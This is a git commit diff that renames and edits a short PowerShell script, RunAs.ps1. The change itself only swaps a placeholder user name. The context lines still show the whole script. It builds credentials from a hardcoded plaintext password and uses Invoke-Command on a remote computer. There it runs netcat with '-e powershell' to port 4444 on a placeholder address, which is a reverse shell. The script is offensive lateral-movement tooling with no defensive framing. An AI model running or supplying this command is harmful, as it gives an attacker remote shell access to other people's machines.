6a6b339c225f9a506a76a10d690ea159c88d46cc
h3ll0clar1c3 <61941106+h3ll0clar1c3@users.noreply.github.com>
2020-03-23 20:47:14 +0200

    Update and rename runas.ps1 to RunAs.ps1

--- RunAs.ps1
+++ RunAs.ps1
@@ -1,4 +1,4 @@
-$user = "Domain\User"
+$user = "Domainx\Userx"
 $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential ($user, $password)
 Invoke-Command -ComputerName Computer123 -ScriptBlock {C:\temp\nc64.exe x.x.x.x 4444 -e powershell } -Credential $credential
